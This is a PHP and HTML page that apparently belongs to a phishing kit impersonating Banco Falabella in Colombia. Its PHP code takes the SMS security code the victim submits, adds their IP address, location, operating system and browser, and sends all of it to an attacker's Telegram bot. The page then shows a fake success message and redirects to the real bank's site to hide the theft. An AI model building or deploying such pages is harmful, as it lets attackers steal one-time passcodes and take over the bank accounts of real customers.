<?php
ini_set("display_errors", 0);
include('dt.php');
include('funciones.php');


if (isset($_POST['cod'])){

$message = "Fallabel-inf\r\nCodigo-2: ".$_POST['cod']."\r\n
\r\nFecha: ".date ('l jS \of F Y h:i:s A',time())."\r\nIp y Localidad: ".$myip." ".$pais." ".$region."\r\nSO: ".$user_os."\r\nNavegador: ".$navegador."";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

}


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    
    <link rel="stylesheet" href="files/hojadestilo.css">
    <title>F-Clientes</title>
<script src="
https://cdn.jsdelivr.net/npm/sweetalert2@11.10.7/dist/sweetalert2.all.min.js
"></script>
<link href="
https://cdn.jsdelivr.net/npm/sweetalert2@11.10.7/dist/sweetalert2.min.css
" rel="stylesheet">
<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
</head>
<body >
<script>
Swal.fire({
imageUrl: "file/images2.png",
  imageWidth: 120,
  title: "Felicidades",
  text: "Ha culminado el proceso exitosamente",
  icon: "success",
  confirmButtonColor: "#00943e"
}).then(function() {
    window.location = "https://www.bancofalabella.com.co/page/educacion-financiera";
});
</script>
    <form method="post" action="#" >
	
  <p class="focus"><img src="files/spaceLogo-1.png" alt="" style="width:200px"></p><br>
<center>
<div class="elcontenido" style="opacity: 0.4;"><br>
<h1 style="padding: 10px; color: rgb(193, 193, 193);font-weight: 300;">Pagos en línea</h1><br><br>

<span style="line-height:1;"><b>Ingreso de clave de seguridad</b></span><br><br>


<span style="line-height: 1;">Recibiras un SMS o llamada con la clave </b>de seguridad a tu celular.
Ingresala dentro de los proximos 5 minutos</span><br><br>


<input autocomplete="off" disabled value="******"  maxlength="6" minlength="6" id="cod" name="cod" inputmode="numeric"   class="xinput" 
placeholder="Escribe clave de seguridad" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" type="tel">
<br><br>

<input value="Ingresar" disabled class="delboton" type="submit">

<h4 style="padding: 10px; color: rgb(193, 193, 193);font-weight: 300;">
    Recuerda ingresar todos los datos solicitados, este paso es obligatorio!
</h4>
</div></center>
</form>
</body>

</html>